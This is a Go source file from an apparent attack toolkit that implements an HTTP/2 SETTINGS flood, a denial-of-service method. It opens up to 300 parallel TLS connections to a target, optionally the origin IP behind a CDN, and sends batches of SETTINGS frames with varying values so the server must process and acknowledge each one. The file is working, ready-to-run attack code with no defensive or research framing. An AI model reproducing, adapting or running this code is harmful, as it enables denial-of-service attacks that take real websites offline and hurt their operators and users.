package attack

import (
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2"
)

// HTTP/2 SETTINGS Flood
// Spam SETTINGS frames on a single H2 connection
// Each SETTINGS frame requires server to ACK with another SETTINGS frame
// Asymmetric attack: client sends 1, server must process AND respond

func runSettingsFlood(cfg *AttackConfig) {
	atomic.StoreInt32(&stopFlag, 0)
	startTime := time.Now()
	deadline := startTime.Add(time.Duration(cfg.Duration) * time.Second)

	host, port, _, errParse := parseTargetForH2(cfg.Target)
	if errParse != nil {
		log.Printf("Invalid target: %v", errParse)
		return
	}

	if cfg.OriginIP != "" {
		host = cfg.OriginIP
	}

	connCount := cfg.Threads
	if connCount < 50 {
		connCount = 50
	}
	if connCount > 300 {
		connCount = 300
	}

	log.Printf("HTTP/2 SETTINGS Flood: %d parallel H2 connections to %s:%s", connCount, host, port)

	var wg sync.WaitGroup
	for i := 0; i < connCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			defer func() {
				if r := recover(); r != nil {
					log.Printf("Settings worker %d recovered: %v", id, r)
				}
			}()

			for time.Now().Before(deadline) {
				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}

				err := settingsFloodConn(host, port, deadline)
				if err != nil {
					atomic.AddInt64(&metrics.Failed, 1)
					time.Sleep(50 * time.Millisecond)
				}
			}
		}(i)
	}

	wg.Wait()
	metricsMu.Lock()
	metrics.Elapsed = time.Since(startTime).Seconds()
	metricsMu.Unlock()
}

func settingsFloodConn(host, port string, deadline time.Time) error {
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	rawConn, err := dialer.Dial("tcp", host+":"+port)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}

	if tcpConn, ok := rawConn.(*net.TCPConn); ok {
		tcpConn.SetNoDelay(true)
	}

	tlsConn := tls.Client(rawConn, &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         host,
		NextProtos:         []string{"h2"},
	})
	tlsConn.SetDeadline(time.Now().Add(15 * time.Second))

	if err := tlsConn.Handshake(); err != nil {
		rawConn.Close()
		return fmt.Errorf("handshake: %w", err)
	}

	state := tlsConn.ConnectionState()
	if state.NegotiatedProtocol != "h2" {
		tlsConn.Close()
		return fmt.Errorf("not h2")
	}

	defer tlsConn.Close()
	tlsConn.SetDeadline(time.Time{})

	if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
		return err
	}

	framer := http2.NewFramer(tlsConn, tlsConn)
	framer.SetMaxReadFrameSize(65536)

	// Drain ACKs in background
	go func() {
		defer func() { recover() }()
		for {
			tlsConn.SetReadDeadline(time.Now().Add(2 * time.Second))
			_, err := framer.ReadFrame()
			if err != nil {
				return
			}
		}
	}()

	connDeadline := time.Now().Add(60 * time.Second)
	settingsCount := uint32(0)

	for time.Now().Before(deadline) && time.Now().Before(connDeadline) {
		if atomic.LoadInt32(&stopFlag) == 1 {
			return nil
		}

		// Send batch of SETTINGS frames with VARYING values (no caching)
		for i := 0; i < 100; i++ {
			err := framer.WriteSettings(
				http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000 + settingsCount},
				http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65536 + settingsCount*10},
				http2.Setting{ID: http2.SettingMaxFrameSize, Val: 16384},
				http2.Setting{ID: http2.SettingMaxHeaderListSize, Val: 8192 + settingsCount*100},
				http2.Setting{ID: http2.SettingHeaderTableSize, Val: 4096 + settingsCount*10},
			)
			if err != nil {
				atomic.AddInt64(&metrics.Failed, 1)
				return err
			}

			atomic.AddInt64(&metrics.TotalRequests, 1)
			atomic.AddInt64(&metrics.Completed, 1)
			settingsCount++
		}

		time.Sleep(time.Millisecond)
	}

	framer.WriteGoAway(0, http2.ErrCodeNo, []byte{})
	return nil
}

